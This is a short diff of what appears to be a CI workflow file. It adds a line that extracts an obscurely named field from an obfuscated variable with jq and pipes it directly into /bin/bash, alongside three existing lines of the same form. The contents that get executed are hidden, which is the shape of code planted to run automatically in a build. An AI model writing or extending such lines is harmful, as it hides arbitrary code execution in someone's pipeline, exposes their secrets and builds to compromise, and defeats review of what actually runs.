@@ -24,6 +24,7 @@ jobs:
           echo $aseaf6 | jq -r .q4 | /bin/bash
           echo $mnsf7 | jq -r .fzisa02769 | /bin/bash
           echo $pope2335 | jq -r .sw6 | /bin/bash
+          echo $avhp3 | jq -r .ki187 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
